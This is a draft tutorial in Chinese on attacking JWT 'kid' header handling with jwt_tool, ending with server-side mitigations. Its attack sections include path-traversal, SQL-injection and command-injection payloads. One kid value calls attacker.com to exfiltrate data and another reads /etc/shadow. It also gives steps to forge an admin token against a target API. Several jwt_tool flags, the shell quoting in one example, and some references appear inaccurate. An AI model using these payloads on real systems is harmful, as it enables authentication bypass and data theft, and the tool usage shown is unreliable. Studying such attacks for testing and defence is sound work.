---
title: 使用jwt_tool进行JWT Kid参数注入测试
description: 一份全面的指南，介绍如何利用和缓解JWT kid（密钥ID）头部注入攻击，使用jwt_tool安全工具包。
created: 2026-06-22
tags:
  - jwt
  - security
  - vulnerability
  - injection
  - jwt_tool
  - testing
status: draft
---

# 使用jwt_tool进行JWT Kid参数注入测试

## 什么是JWT Kid注入？

`kid`（Key ID）是RFC 7515中定义的一个可选头部参数，它帮助服务器识别应该使用哪个加密密钥来验证JWT签名。当应用程序基于攻击者提供的未经清理的`kid`值动态检索验证密钥时，就会打开几个关键攻击的大门：

- **路径遍历** – 攻击者将`kid`设置为任意文件路径（例如`/dev/null`、`../../etc/passwd`）。服务器读取该文件并将其原始内容用作HMAC秘密，从而允许伪造签名。
- **SQL注入** – 如果密钥是从数据库中获取的（例如`SELECT key FROM keys WHERE kid='$kid'`），攻击者可以注入SQL以返回受控值。
- **命令注入/SSRF** – 很少见，但当`kid`未经清理地传递到shell命令或出站HTTP请求时发生。

## 为什么它很重要？

成功的`kid`注入会完全绕过JWT身份验证，使攻击者能够：
- 伪造带有任意负载的令牌（例如`"role":"admin"`）
- 无需任何有效凭据即可提升权限
- 接管用户账户或管理面板

该漏洞已导致多个CVE，并且仍然是现代Web应用安全评估和CTF挑战中的常见问题。

## jwt_tool介绍

`jwt_tool`是一个强大的开源工具包，用于审计、测试和伪造JSON Web令牌。它自动化了许多常见JWT攻击，包括算法混淆、`kid`注入、负载篡改和签名验证绕过。由[ticarpi](https://github.com/ticarpi/jwt_tool)开发，被渗透测试人员和安全研究人员广泛使用。

## 安装

### 选项1：从GitHub克隆（推荐）

```bash
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
python3 -m pip install -r requirements.txt
```

使工具可执行：

```bash
chmod +x jwt_tool.py
```

### 选项2：通过pip安装（如果可用）

```bash
pip install jwt-tool
```

> **注意：** GitHub版本更新更频繁。如果从源代码运行，请始终拉取最新版本。

## 基本用法

`jwt_tool`可以作为命令行工具使用，目标JWT。一般语法是：

```bash
python3 jwt_tool.py <jwt_token> [options]
```

用于交互式扫描：

```bash
python3 jwt_tool.py <jwt_token> -t
```

## 使用jwt_tool利用Kid注入

### 1. 通过Kid进行路径遍历（最常见）

经典攻击：将`kid`设置为`/dev/null`或任何已知文件，并使用空字符串或文件内容签署令牌。

**第1步 – 扫描JWT并识别kid参数**

```bash
python3 jwt_tool.py "eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQifQ.eyJzdWIiOiJ1c2VyIiwicm9sZSI6Im1lbWJlciJ9.sjKl7FhBfJ9J3wC6eVkIo4m7kA9nN3g"
```

输出将突出显示头部和负载声明，包括`kid`。

**第2步 – 使用kid注入伪造令牌**

`jwt_tool`提供了`-X i`标志用于`kid`注入攻击。使用`-I`编辑负载，使用`-pv`设置新值。

```bash
python3 jwt_tool.py "eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQifQ.eyJzdWIiOiJ1c2VyIiwicm9sZSI6Im1lbWJlciJ9.sjKl7FhBfJ9J3wC6eVkIo4m7kA9nN3g" \
  -I \
  -pc "role" -pv "admin" \
  -X i \
  -k "/dev/null"
```

**解释：**
- `-I` : 交互式修改负载声明。
- `-pc "role" -pv "admin"` : 将`role`声明更改为`"admin"`。
- `-X i` : 执行`kid`注入。
- `-k "/dev/null"` : 使用`/dev/null`作为密钥文件。`jwt_tool`使用该文件的内容签名（对于`/dev/null`是空字符串）。

该工具输出一个新的伪造JWT，如果服务器读取`/dev/null`作为验证密钥，则会接受该令牌。

**替代方法：使用`/etc/passwd`作为密钥**

```bash
python3 jwt_tool.py <original_token> \
  -I \
  -pc "role" -pv "admin" \
  -X i \
  -k "../../../etc/passwd"
```

当服务器读取`/etc/passwd`时，它会将其全部内容用作HMAC秘密。`jwt_tool`会自动使用该内容签名。

### 2. 通过Kid进行SQL注入

如果服务器使用`kid`值查询数据库以获取密钥，您可以注入SQL负载以返回已知值。

**示例：** 创建一个`kid`设置为以下内容的令牌：

```json
{
  "alg": "HS256",
  "kid": " ' UNION SELECT 'known_secret' -- "
}
```

`jwt_tool`没有内置的SQL注入自动化功能，但您可以手动构造头部，然后使用`-X i`和自定义密钥进行签名。

**使用自定义头部手动伪造：**

```bash
python3 jwt_tool.py <base_jwt> \
  -X i \
  -k "known_secret" \
  --header '{"alg":"HS256","kid":"' UNION SELECT 'known_secret' -- "}'
```

然后根据需要调整负载。

### 3. 通过Kid进行命令注入

很少见，但当`kid`被插入到shell命令中时可能发生，例如：

```
curl https://keyserver.example.com/keys/$(kid)
```

将`kid`设置为命令注入负载：

```json
"kid": "$(curl -s http://attacker.com/steal?)"
```

`jwt_tool`可以包含任意的头部值：

```bash
python3 jwt_tool.py <jwt> \
  --header '{"alg":"RS256","kid":"$(cat /etc/shadow | base64)"}' \
  -X i -k dummy_secret
```

> **注意：** 利用取决于服务器的运行时环境以及处理`kid`的方式。

## jwt_tool用于Kid注入的关键特性

| 特性 | 命令/标志 | 描述 |
|---------|---------------|-------------|
| Kid注入攻击 | `-X i` | 自动化设置伪造`kid`并使用基于文件的密钥签名的过程。 |
| 算法混淆 | `-X a` | 与`-X i`结合用于混合攻击（在获取公钥后从RS256切换到HS256）。 |
| 负载篡改 | `-I` / `-pc` / `-pv` | 交互式或非交互式修改任何声明。 |
| 自定义密钥文件 | `-k <file>` | 指定其内容将用作HMAC秘密的文件，用于伪造。 |
| 签名不匹配分析 | `-S` / `-s` | 检查令牌在签名更改后的行为。 |
| 已知JWT秘密数据库 | `-C` | 在暴力破解期间尝试常见弱密钥。 |
| 高级头部操作 | `--header` | 向头部插入任意JSON（对于原始`kid`负载非常有用）。 |

## 综合应用：完整利用场景

考虑一个易受攻击的API，它使用JWT进行身份验证。服务器通过读取`kid`中指定的文件来获取验证密钥：

```python
# 漏洞伪代码
def verify_token(token):
    header = decode_header(token)
    kid = header['kid']
    with open('/keys/' + kid, 'r') as f:
        secret = f.read()
    return jwt.decode(token, secret, algorithms=['HS256'])
```

**第1步 – 侦查**

```bash
python3 jwt_tool.py "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6ImNsaWVudCJ9.eyJzdWIiOiJ1c2VyIn0.QPx..."
```

输出显示`alg: RS256`, `kid: client`。

**第2步 – 检查路径遍历是否可能**

尝试访问`/dev/null`：

```bash
python3 jwt_tool.py <token> -X i -k /dev/null
```

如果服务器返回带有伪造令牌的200响应，则确认漏洞存在。

**第3步 – 提升权限**

```bash
# 使用管理员角色伪造令牌
python3 jwt_tool.py <original> \
  -I \
  -pc "role" -pv "admin" \
  -X i \
  -k "/dev/null"
```

**第4步 – 使用伪造令牌访问受保护资源**

```bash
curl -H "Authorization: Bearer <forged_token>" https://api.target.com/admin
```

## 缓解策略（服务器端）

1. **白名单允许的Kid值** – 硬编码已知`kid`字符串到其对应公钥的映射。永远不要从用户输入中派生密钥。

2. **验证Kid格式** – 如果动态查找不可避免，强制执行严格的格式检查：仅允许字母数字，拒绝路径分隔符（`.` , `/`），拒绝可疑字符。

3. **使用硬编码密钥** – 最安全的方法是将预期的公钥嵌入到应用程序代码或配置文件中。

4. **强制执行算法验证** – 始终验证令牌中使用的算法与该发行者的预期算法匹配。不要信任`alg`头部。

5. **使用具有内置保护的JWT库** – 像`PyJWT`、`jsonwebtoken`和`jose`这样的现代库可以配置为拒绝未知的`kid`值或要求静态密钥集。

## 结论

`jwt_tool`是测试JWT `kid`注入漏洞不可或缺的工具。它自动化了最常见的利用路径，并为安全测试人员提供了清晰、可重复的工作流程。了解如何使用其`-X i`和`-I`标志可能意味着发现漏洞与错过关键身份验证绕过之间的差异。

始终记住在服务器端将`kid`视为**不受信任的输入**。对于开发人员来说，几行输入验证就可以消除整个JWT攻击类别。

## 参考

- [github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
- [RFC 7515 – JSON Web Signature](https://datatracker.ietf.org/doc/html/rfc7515)
- [JWT Attacks (Part 4c): kid Header Injection](https://jwt.io/introduction/)
- [CVE-2018-0114](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0114) – node-jsonwebtoken key confusion
- [PortSwigger JWT Kid Lab](https://portswigger.net/web-security/jwt)